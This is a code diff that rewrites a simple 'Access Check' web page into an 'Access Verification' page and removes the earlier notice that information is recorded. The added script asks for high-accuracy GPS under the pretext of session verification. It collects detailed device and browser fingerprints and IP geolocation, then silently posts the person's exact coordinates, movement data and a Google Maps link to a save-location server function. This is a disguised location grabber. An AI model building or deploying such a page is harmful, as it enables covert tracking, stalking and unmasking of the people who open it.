@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>Access Check</title>
+  <title>Access Verification</title>
 
   <style>
     * {
@@ -17,119 +16,434 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #f5f6f8;
+      background: #f5f7fa;
       font-family: Arial, sans-serif;
     }
 
     .box {
       width: 90%;
       max-width: 420px;
-      background: white;
+      background: #fff;
       padding: 35px;
       border-radius: 14px;
       text-align: center;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+      box-shadow: 0 8px 30px rgba(0,0,0,.08);
     }
 
     h2 {
       margin: 0 0 12px;
-      font-size: 22px;
     }
 
     p {
       color: #666;
-      line-height: 1.5;
       font-size: 14px;
+      line-height: 1.5;
     }
 
-    .status {
+    #status {
       margin-top: 20px;
       font-size: 14px;
       color: #333;
-    }
-
-    .notice {
-      margin-top: 18px;
-      font-size: 12px;
-      color: #777;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="box">
+<div class="box">
+  <h2>Access Verification</h2>
 
-    <h2>Access Check</h2>
+  <p>
+    Location permission is required to verify this session.
+  </p>
 
-    <p>
-      Please wait while we verify your connection.
-    </p>
-
-    <div class="status" id="status">
-      Checking connection...
-    </div>
-
-    <div class="notice">
-      This page records basic connection and browser information
-      for access verification.
-    </div>
-
+  <div id="status">
+    Requesting location...
   </div>
+</div>
+
+<script>
+
+function getDeviceType() {
+
+  const ua = navigator.userAgent || "";
+
+  if (/iPad|Tablet/i.test(ua)) {
+    return "Tablet";
+  }
+
+  if (/Android/i.test(ua) && !/Mobile/i.test(ua)) {
+    return "Tablet";
+  }
+
+  if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
+    return "Mobile";
+  }
+
+  return "Desktop/Laptop";
+}
 
 
-  <script>
+function getOperatingSystem() {
 
-    async function checkConnection() {
+  const ua = navigator.userAgent || "";
 
-      const status = document.getElementById("status");
+  if (/Windows/i.test(ua)) return "Windows";
+  if (/Android/i.test(ua)) return "Android";
+  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+  if (/Mac OS X/i.test(ua)) return "macOS";
+  if (/Linux/i.test(ua)) return "Linux";
+
+  return "Unknown";
+}
+
+
+function getBrowser() {
+
+  const ua = navigator.userAgent || "";
+
+  if (/Edg\//i.test(ua)) return "Microsoft Edge";
+  if (/OPR\//i.test(ua)) return "Opera";
+  if (/Chrome\//i.test(ua)) return "Google Chrome";
+  if (/Firefox\//i.test(ua)) return "Mozilla Firefox";
+  if (/Safari\//i.test(ua)) return "Safari";
+
+  return "Unknown";
+}
+
+
+function getDeviceName() {
+
+  const ua = navigator.userAgent || "";
+
+  if (/iPhone/i.test(ua)) return "iPhone";
+  if (/iPad/i.test(ua)) return "iPad";
+
+  if (/Android/i.test(ua)) {
+
+    const match = ua.match(
+      /Android.*?;\s*([^;)]+?)(?:\s+Build\/|;|\))/i
+    );
+
+    if (match && match[1]) {
+      return match[1].trim();
+    }
+
+    return "Android Device";
+  }
+
+  if (/Windows/i.test(ua)) return "Windows Computer";
+  if (/Macintosh/i.test(ua)) return "Mac";
+  if (/Linux/i.test(ua)) return "Linux Computer";
+
+  return "Unknown";
+}
+
+
+function getDeviceInfo() {
+
+  return {
+    device_type: getDeviceType(),
+    device_name: getDeviceName(),
+    operating_system: getOperatingSystem(),
+    browser: getBrowser(),
+    user_agent: navigator.userAgent || "",
+    platform: navigator.platform || "",
+    language: navigator.language || "",
+    screen_width: window.screen.width || "",
+    screen_height: window.screen.height || "",
+    timezone:
+      Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+  };
+
+}
+
+
+async function getIPInformation() {
+
+  try {
+
+    const response = await fetch(
+      "/.netlify/functions/location",
+      {
+        method: "GET",
+        cache: "no-store"
+      }
+    );
+
+    return await response.json();
+
+  } catch (error) {
+
+    console.error("IP lookup failed:", error);
+
+    return {
+      success: false
+    };
+
+  }
+
+}
+
+
+async function saveLocation(data) {
+
+  const response = await fetch(
+    "/.netlify/functions/save-location",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }
+  );
+
+  return await response.json();
+
+}
+
+
+function requestGPS() {
+
+  const status =
+    document.getElementById("status");
+
+
+  if (!navigator.geolocation) {
+
+    status.textContent =
+      "GPS is not supported by this browser.";
+
+    return;
+  }
+
+
+  status.textContent =
+    "Requesting device location...";
+
+
+  navigator.geolocation.getCurrentPosition(
+
+    async function(position) {
 
       try {
 
-        const response = await fetch(
-          "/.netlify/functions/location",
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              page: window.location.href,
-              referrer: document.referrer || ""
-            })
-          }
+        const coords =
+          position.coords;
+
+        const ip =
+          await getIPInformation();
+
+        const device =
+          getDeviceInfo();
+
+
+        const mapsUrl =
+          "https://www.google.com/maps?q=" +
+          coords.latitude +
+          "," +
+          coords.longitude;
+
+
+        const data = {
+
+          timestamp:
+            new Date().toISOString(),
+
+
+          ip:
+            ip.ip || "",
+
+          hostname:
+            ip.hostname || "",
+
+          ip_version:
+            ip.version || "",
+
+          ip_city:
+            ip.city || "",
+
+          ip_region:
+            ip.region || "",
+
+          ip_country:
+            ip.country || "",
+
+          ip_latitude:
+            ip.latitude ?? "",
+
+          ip_longitude:
+            ip.longitude ?? "",
+
+          ip_organization:
+            ip.organization || "",
+
+          ip_asn:
+            ip.asn || "",
+
+          ip_postal:
+            ip.postal || "",
+
+          ip_timezone:
+            ip.timezone || "",
+
+
+          device_type:
+            device.device_type,
+
+          device_name:
+            device.device_name,
+
+          operating_system:
+            device.operating_system,
+
+          browser:
+            device.browser,
+
+          platform:
+            device.platform,
+
+          language:
+            device.language,
+
+          user_agent:
+            device.user_agent,
+
+          screen_width:
+            device.screen_width,
+
+          screen_height:
+            device.screen_height,
+
+          device_timezone:
+            device.timezone,
+
+
+          device_latitude:
+            coords.latitude,
+
+          device_longitude:
+            coords.longitude,
+
+          device_accuracy:
+            coords.accuracy,
+
+          altitude:
+            coords.altitude ?? "",
+
+          altitude_accuracy:
+            coords.altitudeAccuracy ?? "",
+
+          heading:
+            coords.heading ?? "",
+
+          speed:
+            coords.speed ?? "",
+
+          gps_timestamp:
+            position.timestamp
+              ? new Date(
+                  position.timestamp
+                ).toISOString()
+              : "",
+
+
+          google_maps:
+            mapsUrl,
+
+          location_source:
+            "Device / Browser GPS"
+
+        };
+
+
+        status.textContent =
+          "Saving location...";
+
+
+        const result =
+          await saveLocation(data);
+
+
+        console.log(
+          "Save result:",
+          result
         );
 
-        const result = await response.json();
 
         if (result.success) {
 
           status.textContent =
-            "Connection verified.";
+            "Verification completed.";
 
         } else {
 
           status.textContent =
-            "Connection verification failed.";
-
-          console.error(result);
+            "Unable to save verification.";
 
         }
 
-      } catch (error) {
 
-        status.textContent =
-          "Connection verification failed.";
+      } catch (error) {
 
         console.error(error);
 
+        status.textContent =
+          "Something went wrong.";
+
       }
 
+    },
+
+
+    function(error) {
+
+      console.error(
+        "GPS error:",
+        error
+      );
+
+
+      if (error.code === 1) {
+
+        status.textContent =
+          "Location permission was denied.";
+
+      } else if (error.code === 2) {
+
+        status.textContent =
+          "Device location is unavailable.";
+
+      } else if (error.code === 3) {
+
+        status.textContent =
+          "Location request timed out.";
+
+      } else {
+
+        status.textContent =
+          "Unable to get device location.";
+
+      }
+
+    },
+
+
+    {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumAge: 0
     }
 
-    checkConnection();
+  );
 
-  </script>
+}
+
+
+requestGPS();
+
+</script>
 
 </body>
 </html>
